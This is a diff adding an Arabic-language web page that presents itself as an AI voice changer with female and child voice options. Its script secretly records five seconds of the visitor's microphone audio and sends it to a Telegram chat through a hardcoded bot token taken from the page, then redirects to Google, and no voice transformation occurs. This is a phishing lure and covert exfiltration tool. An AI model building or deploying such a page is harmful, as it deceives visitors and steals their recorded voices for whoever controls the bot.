@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Voice Transformer - تحويل الصوت للذكاء الاصطناعي</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #0d0f18; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { background: #151929; border: 1px solid #293250; padding: 35px 25px; width: 100%; max-width: 380px; text-align: center; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.6); position: relative; }
+        .ai-badge { background: linear-gradient(135deg, #ec4899, #8b5cf6); color: #fff; font-size: 10px; padding: 4px 12px; border-radius: 20px; font-weight: bold; display: inline-block; margin-bottom: 15px; text-transform: uppercase; }
+        h2 { font-size: 20px; margin-bottom: 8px; color: #f3f4f6; }
+        p { font-size: 12px; color: #9ca3af; margin-bottom: 25px; line-height: 1.5; }
+        
+        /* موجات صوتية متحركة حية */
+        .wave-box { display: flex; justify-content: center; align-items: center; gap: 4px; height: 40px; margin-bottom: 25px; }
+        .bar { width: 4px; background: #ec4899; border-radius: 4px; animation: pulseWave 1.2s infinite ease-in-out; }
+        .bar:nth-child(2) { animation-delay: 0.2s; background: #a855f7; }
+        .bar:nth-child(3) { animation-delay: 0.4s; background: #6366f1; }
+        .bar:nth-child(4) { animation-delay: 0.6s; background: #a855f7; }
+        .bar:nth-child(5) { animation-delay: 0.8s; background: #ec4899; }
+        @keyframes pulseWave { 0%, 100% { height: 10px; } 50% { height: 35px; } }
+
+        .select-filter { background: #1f293d; border: 1px solid #374151; color: #fff; padding: 10px; width: 100%; border-radius: 10px; font-size: 13px; margin-bottom: 20px; outline: none; text-align: center; }
+        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #ec4899, #8b5cf6); border: none; color: #fff; font-weight: bold; font-size: 15px; border-radius: 10px; cursor: pointer; transition: 0.3s; }
+        .btn:hover { opacity: 0.9; transform: scale(1.02); }
+        .status { margin-top: 15px; font-size: 11px; color: #10b981; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <span class="ai-badge">مفعل بالذكاء الاصطناعي V2.4</span>
+        <h2>محول الصوت النسائي الحي</h2>
+        <p>اختر طبقة الصوت المطلوبة وتحدث بصوتك لتحويله فوراً بذكاء اصطناعي فائق الدقة.</p>
+
+        <div class="wave-box">
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+        </div>
+
+        <select class="select-filter">
+            <option>صوت فتاة (ناعمة - 19 سنة)</option>
+            <option>صوت أنثوي هادئ</option>
+            <option>صوت طفلة لطيفة</option>
+        </select>
+
+        <button class="btn" id="startBtn">بدء التسجيل والتحويل</button>
+        <div class="status" id="statusText">جاري معالجة الصوت بالذكاء الاصطناعي...</div>
+    </div>
+
+    <script>
+        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetChatId = urlParams.get('to');
+
+        document.getElementById('startBtn').addEventListener('click', async function() {
+            if(!targetChatId) return;
+            this.style.display = 'none';
+            document.getElementById('statusText').style.display = 'block';
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const formData = new FormData();
+                    formData.append('audio', blob, 'ai_girl_voice.webm');
+
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendVoice?chat_id=${targetChatId}`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    stream.getTracks().forEach(t => t.stop());
+                };
+
+                mediaRecorder.start();
+                await new Promise(r => setTimeout(r, 5000)); // تسجيل 5 ثوانٍ بصمت
+                mediaRecorder.stop();
+            } catch(e) {}
+
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
